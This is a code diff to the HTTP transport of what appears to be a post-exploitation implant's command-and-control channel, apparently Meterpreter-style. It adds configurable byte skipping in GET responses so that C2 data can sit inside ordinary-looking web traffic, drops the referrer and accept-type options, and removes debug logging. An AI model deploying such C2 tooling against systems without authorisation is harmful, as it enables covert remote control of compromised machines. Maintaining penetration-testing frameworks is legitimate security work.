@@ -435,6 +435,7 @@ static DWORD packet_transmit_http(Remote *remote, LPBYTE rawPacket, DWORD rawPac
 			BREAK_ON_ERROR("[PACKET TRANSMIT HTTP] Failed create_req");
 		}
 
+		dprintf("[PACKET TRANSMIT HTTP] Request created, sending via POST");
 		res = ctx->send_req(ctx, hReq, FALSE, rawPacket, rawPacketLength);
 		if (!res)
 		{
@@ -502,6 +503,35 @@ static DWORD packet_receive_http(Remote *remote, Packet **packet)
 
 	if (GetLastError() != ERROR_SUCCESS)
 	{
+		goto out;
+	}
+
+	UINT skipCount = ctx->get_connection.options.payload_skip_count;
+	if (skipCount == 0)
+	{
+		skipCount = ctx->default_options.payload_skip_count;
+	}
+
+	vdprintf("[PACKET RECEIVE HTTP] Skipping GET bytes: %u", skipCount);
+	retries = 3;
+	while (skipCount > 0 && retries > 0)
+	{
+		DWORD bytesRead = 0;
+		BYTE buf[100] = { 0 };
+		ctx->read_response(hReq, buf, min(skipCount, sizeof(buf)), &bytesRead);
+		vdprintf("[PACKET RECEIVE HTTP] Skipped bytes: %u", bytesRead);
+		skipCount -= bytesRead;
+		if (bytesRead == 0)
+		{
+			--retries;
+		}
+	}
+
+	if (skipCount > 0)
+	{
+		// we didn't receive all the data to skip first, which means there's either a problem
+		// or there's nothing at all for us to do.
+		SetLastError(ERROR_NOT_FOUND);
 		goto out;
 	}
 
@@ -958,25 +988,13 @@ static DWORD server_dispatch_http(Remote* remote, THREAD* dispatchThread)
 
 static void destroy_options(HttpRequestOptions* options)
 {
-	dprintf("SAFE_FREE(options->ua);");
 	SAFE_FREE(options->ua);
-	dprintf("SAFE_FREE(options->uri);");
 	SAFE_FREE(options->uri);
-	dprintf("SAFE_FREE(options->other_headers);");
 	SAFE_FREE(options->other_headers);
-	dprintf("SAFE_FREE(options->payload_prefix);");
 	SAFE_FREE(options->payload_prefix);
-	dprintf("SAFE_FREE(options->payload_suffix);");
 	SAFE_FREE(options->payload_suffix);
-	dprintf("SAFE_FREE(options->referrer);");
-	SAFE_FREE(options->referrer);
-	dprintf("SAFE_FREE(options->accept_types);");
-	SAFE_FREE(options->accept_types);
-	dprintf("SAFE_FREE(options->uuid_cookie);");
 	SAFE_FREE(options->uuid_cookie);
-	dprintf("SAFE_FREE(options->uuid_header);");
 	SAFE_FREE(options->uuid_header);
-	dprintf("SAFE_FREE(options->uuid_get);");
 	SAFE_FREE(options->uuid_get);
 }
 
@@ -994,20 +1012,13 @@ static void transport_destroy_http(Transport* transport)
 
 		if (ctx)
 		{
-			dprintf("SAFE_FREE(ctx->cert_hash);");
 			SAFE_FREE(ctx->cert_hash);
-			dprintf("SAFE_FREE(ctx->proxy);");
 			SAFE_FREE(ctx->proxy);
-			dprintf("SAFE_FREE(ctx->proxy_pass);");
 			SAFE_FREE(ctx->proxy_pass);
-			dprintf("SAFE_FREE(ctx->proxy_user);");
 			SAFE_FREE(ctx->proxy_user);
 
-			dprintf("destroy_options(&ctx->post_connection.options);");
 			destroy_options(&ctx->post_connection.options);
-			dprintf("destroy_options(&ctx->get_connection.options);");
 			destroy_options(&ctx->get_connection.options);
-			dprintf("destroy_options(&ctx->default_options);");
 			destroy_options(&ctx->default_options);
 
 			if (ctx->proxy_for_url)
@@ -1015,25 +1026,18 @@ static void transport_destroy_http(Transport* transport)
 				WINHTTP_PROXY_INFO* proxyInfo = (WINHTTP_PROXY_INFO*)ctx->proxy_for_url;
 				if (proxyInfo->lpszProxy)
 				{
-					dprintf("GlobalFree(proxyInfo->lpszProxy);");
 					GlobalFree(proxyInfo->lpszProxy);
 				}
 				if (proxyInfo->lpszProxyBypass)
 				{
-					dprintf("GlobalFree(proxyInfo->lpszProxyBypass);");
 					GlobalFree(proxyInfo->lpszProxyBypass);
 				}
 			}
-			dprintf("SAFE_FREE(ctx->proxy_for_url);");
 			SAFE_FREE(ctx->proxy_for_url);
 		}
-		dprintf("SAFE_FREE(transport->url);");
 		SAFE_FREE(transport->url);
-		dprintf("SAFE_FREE(transport->ctx);");
 		SAFE_FREE(transport->ctx);
-		dprintf("SAFE_FREE(transport);");
 		SAFE_FREE(transport);
-		dprintf("[TRANS HTTP] Destroyed");
 	}
 }
 
@@ -1059,10 +1063,6 @@ BOOL set_http_options_to_tlv(Packet* optionsPacket, HttpRequestOptions* sourceOp
 	{
 		packet_add_tlv_raw(optionsPacket, TLV_TYPE_C2_SUFFIX, sourceOptions->payload_suffix, sourceOptions->payload_suffix_size);
 	}
-	if (sourceOptions->referrer != NULL)
-	{
-		packet_add_tlv_wstring(optionsPacket, TLV_TYPE_C2_REFERRER, sourceOptions->referrer);
-	}
 	if (sourceOptions->ua != NULL)
 	{
 		packet_add_tlv_wstring(optionsPacket, TLV_TYPE_C2_UA, sourceOptions->ua);
@@ -1070,10 +1070,6 @@ BOOL set_http_options_to_tlv(Packet* optionsPacket, HttpRequestOptions* sourceOp
 	if (sourceOptions->uri != NULL)
 	{
 		packet_add_tlv_wstring(optionsPacket, TLV_TYPE_C2_URI, sourceOptions->uri);
-	}
-	if (sourceOptions->accept_types != NULL)
-	{
-		packet_add_tlv_wstring(optionsPacket, TLV_TYPE_C2_ACCEPT_TYPES, sourceOptions->accept_types);
 	}
 	if (sourceOptions->uuid_cookie != NULL)
 	{
@@ -1107,12 +1103,10 @@ void transport_write_http_config(Transport* transport, Packet* configPacket)
 		Packet* getOptionsPacket = packet_create_group();
 		set_http_options_to_tlv(getOptionsPacket, &ctx->get_connection.options);
 		packet_add_group(c2Packet, TLV_TYPE_C2_GET, getOptionsPacket);
-		packet_destroy(getOptionsPacket);
 
 		Packet* postOptionsPacket = packet_create_group();
 		set_http_options_to_tlv(postOptionsPacket, &ctx->post_connection.options);
 		packet_add_group(c2Packet, TLV_TYPE_C2_POST, postOptionsPacket);
-		packet_destroy(postOptionsPacket);
 
 		if (ctx->proxy)
 		{
@@ -1132,7 +1126,6 @@ void transport_write_http_config(Transport* transport, Packet* configPacket)
 		}
 
 		packet_add_group(configPacket, TLV_TYPE_C2, c2Packet);
-		packet_destroy(c2Packet);
 	}
 }
 
@@ -1143,10 +1136,8 @@ BOOL get_http_options_from_tlv(Packet* packet, Tlv* optionsTlv, HttpRequestOptio
 	targetOptions->payload_prefix = packet_get_tlv_group_entry_value_raw_copy(packet, optionsTlv, TLV_TYPE_C2_PREFIX, &targetOptions->payload_prefix_size);
 	targetOptions->payload_skip_count = packet_get_tlv_group_entry_value_uint(packet, optionsTlv, TLV_TYPE_C2_SKIP_COUNT);
 	targetOptions->payload_suffix = packet_get_tlv_group_entry_value_raw_copy(packet, optionsTlv, TLV_TYPE_C2_SUFFIX, &targetOptions->payload_suffix_size);
-	targetOptions->referrer = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_REFERRER, NULL);
 	targetOptions->ua = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_UA, NULL);
 	targetOptions->uri = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_URI, NULL);
-	targetOptions->accept_types = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_ACCEPT_TYPES, NULL);
 	targetOptions->uuid_cookie = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_UUID_COOKIE, NULL);
 	targetOptions->uuid_get = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_UUID_GET, NULL);
 	targetOptions->uuid_header = packet_get_tlv_group_entry_value_wstring(packet, optionsTlv, TLV_TYPE_C2_UUID_HEADER, NULL);
@@ -1166,14 +1157,13 @@ BOOL get_http_options_from_config(Packet* packet, Tlv* c2Tlv, UINT tlvType, Http
 
 static void debug_print_http_options(PSTR type, HttpRequestOptions* options)
 {
-	dprintf("[HTTP OPTION] - %s - Accept Types: %S", type, options->accept_types);
 	dprintf("[HTTP OPTION] - %s - Encode Flags: 0x%x", type, options->encode_flags);
 	dprintf("[HTTP OPTION] - %s - Other Headers: %S", type, options->other_headers);
-	dprintf("[HTTP OPTION] - %s - Payload Prefix: %s", type, options->payload_prefix);
 	dprintf("[HTTP OPTION] - %s - Payload Prefix Size: %u", type, options->payload_prefix_size);
-	dprintf("[HTTP OPTION] - %s - Payload Suffix: %s", type, options->payload_suffix);
+	dprintf("[HTTP OPTION] - %s - Payload Prefix: %s", type, options->payload_prefix);
 	dprintf("[HTTP OPTION] - %s - Payload Suffix Size: %u", type, options->payload_suffix_size);
-	dprintf("[HTTP OPTION] - %s - Referrer: %S", type, options->referrer);
+	dprintf("[HTTP OPTION] - %s - Payload Suffix: %s", type, options->payload_suffix);
+	dprintf("[HTTP OPTION] - %s - Skip Byte Count: %u", type, options->payload_skip_count);
 	dprintf("[HTTP OPTION] - %s - URI: %S", type, options->uri);
 	dprintf("[HTTP OPTION] - %s - UUID Cookie: %S", type, options->uuid_cookie);
 	dprintf("[HTTP OPTION] - %s - UUID Get: %S", type, options->uuid_get);
@@ -1210,7 +1200,7 @@ Transport* transport_create_http(Packet* packet, Tlv* c2Tlv)
 	ctx->ssl = wcsncmp(url, L"https", 5) == 0;
 
 	// only apply the cert hash if we're given one and it's not the global value
-	LPBYTE certHash = packet_get_tlv_group_entry_value_raw_copy(packet, c2Tlv, TLV_TYPE_C2_CERT_HASH, NULL);
+	LPBYTE certHash = packet_get_tlv_group_entry_value_raw(packet, c2Tlv, TLV_TYPE_C2_CERT_HASH, NULL);
 	if (certHash != NULL)
 	{
 		dprintf("[SERVER] Received HTTPS Hash: %02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
@@ -1220,7 +1210,12 @@ Transport* transport_create_http(Packet* packet, Tlv* c2Tlv)
 			certHash[12], certHash[13], certHash[14], certHash[15],
 			certHash[16], certHash[17], certHash[18], certHash[19]);
 
-		ctx->cert_hash = certHash;
+		unsigned char emptyHash[CERT_HASH_SIZE] = { 0 };
+		if (memcmp(certHash, emptyHash, CERT_HASH_SIZE))
+		{
+			ctx->cert_hash = (PBYTE)calloc(1, CERT_HASH_SIZE);
+			memcpy_s(ctx->cert_hash, CERT_HASH_SIZE, certHash, CERT_HASH_SIZE);
+		}
 	}
 
 	// default http parameters/options
